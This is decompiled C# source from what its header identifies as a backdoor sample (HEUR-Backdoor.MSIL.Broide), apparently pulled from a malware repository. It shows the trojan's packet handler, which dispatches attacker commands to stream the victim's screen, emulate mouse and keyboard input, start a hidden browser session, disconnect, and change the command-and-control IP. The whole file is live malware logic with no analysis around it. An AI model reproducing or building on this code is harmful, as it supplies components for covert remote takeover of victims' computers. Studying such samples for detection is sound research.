// Decompiled with JetBrains decompiler
// Type: RemoteClient.Packets.PacketsHandler
// Assembly: rtewsd, Version=1.0.0.23, Culture=neutral, PublicKeyToken=null
// MVID: 26A2B99D-71EF-4F92-906D-8BA9A2FB9EEF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Backdoor.MSIL.Broide.gen-4409d2170aa9989c6a8dd32b617c51a7c3e328b3c86410813c016691b2bd7774.exe

using RemoteClient.Packets.Server;
using System;
using System.Threading;

namespace RemoteClient.Packets
{
  internal class PacketsHandler
  {
    private static Thread streamThread;

    public static void HandlePackets(RemoteClient.RemoteClient remClient, ServerPackets.IServerPacket packet)
    {
      if (packet != null)
      {
        switch (packet.GetType())
        {
          case 1:
            Helpers.BrowserLogging("stream start received");
            byte byte2 = ((ServerPackets.StartStream) packet).byte_2;
            remClient.streamClass.StopStream = false;
            PacketsHandler.streamThread = new Thread(new ParameterizedThreadStart(remClient.streamClass.WaitReq));
            PacketsHandler.streamThread.Start((object) byte2);
            Helpers.BrowserLogging("stream started succces");
            break;
          case 2:
            remClient.streamClass.StopStream = true;
            break;
          case 3:
            InputEmulation.HandleDoMouseEvent((ServerPackets.DoMouseEvent) packet);
            break;
          case 4:
            InputEmulation.HandleDoKeyboardEvent((ServerPackets.DoKeyboardEvent) packet);
            break;
          case 5:
            // ISSUE: object of a compiler-generated type is created
            // ISSUE: reference to a compiler-generated method
            new Thread(new ThreadStart(new PacketsHandler.InitBrowserCls()
            {
              byte_0 = ((ServerPackets.StartBrowser) packet).byte_8
            }.comp_InitBrowser)).Start();
            break;
          case 6:
            Program.needReconnect = false;
            Connection.RemoteClient_2.Dispose();
            break;
          case 8:
            remClient.AuthStream();
            break;
          case 9:
            Config.retip = ((ServerPackets.SetPupIp) packet).LogData;
            Connection.RemoteClient_2.Dispose();
            break;
        }
      }
      packet = (ServerPackets.IServerPacket) null;
      GC.Collect();
    }
  }
}
